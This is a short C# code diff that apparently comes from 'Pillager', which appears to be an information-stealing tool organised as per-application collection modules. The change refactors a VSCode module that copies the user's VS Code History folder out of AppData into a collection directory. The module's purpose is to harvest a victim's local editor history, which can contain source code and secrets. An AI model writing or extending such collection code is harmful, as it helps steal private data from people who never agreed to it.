@@ -4,17 +4,15 @@ using Pillager.Helper;
 
 namespace Pillager.Softwares
 {
-    internal class VSCode
+    internal class VSCode : ICommand
     {
-        public static string SoftwareName = "VSCode";
-
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string historypath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Code\\User\\History");
                 if (!Directory.Exists(historypath)) return;
-                string savepath = Path.Combine(path, SoftwareName);
+                string savepath = Path.Combine(path, "VSCode");
                 Directory.CreateDirectory(savepath);
                 Methods.CopyDirectory(historypath, Path.Combine(savepath, "History"), true);
             }
